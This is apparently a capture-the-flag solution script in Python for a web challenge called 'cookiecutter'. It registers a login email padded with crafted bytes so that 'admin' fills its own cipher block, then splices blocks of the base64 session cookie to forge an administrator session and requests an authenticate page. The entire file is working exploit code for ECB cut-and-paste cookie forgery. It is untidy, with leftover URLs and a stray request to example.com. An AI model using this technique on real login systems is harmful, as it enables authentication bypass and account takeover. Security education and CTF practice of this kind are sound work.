import requests
import base64
# Define the URL where the form is submitted
url = 'https://yourdomain.com/login'
url = 'http://127.0.0.1:1337/'
url = 'https://cookiecutter.chal.cyberjousting.com/'

# Define the form data
form_data = {
    'email': '7890123456admin' + 0xb * b'\x0b'.decode('utf-8') 
}

# Send the POST request
response = requests.post(url + 'login', data=form_data)

if response.status_code == 200:
    # Print the cookies received in the response
    cookies = response.cookies
    print(cookies)
    for cookie in cookies:
        val = base64.b64decode(cookie.value)
        print(len(val))
        tar = val[16:32]
        new_val = val[:-16] + tar
        print(f'{cookie.name} = {val}')
        print(f'{cookie.name} = {new_val}')
        #cookies['cookie'] = new_val
        new_val = base64.b64encode(new_val)
else:
    print(f'Failed to login, status code: {response.status_code}')

# Optionally, to use these cookies in subsequent requests
session = requests.Session()
session.cookies.set("cookie",new_val.decode('utf-8'))
#print("cookie")

print(response.text)

# Example of making a subsequent request with the session
response = session.get('https://example.com/protected_page')



auth_response = session.get(url + 'authenticate')
print(f'Status Code: {auth_response.status_code}')
print(f'Response Text: {auth_response.text}')

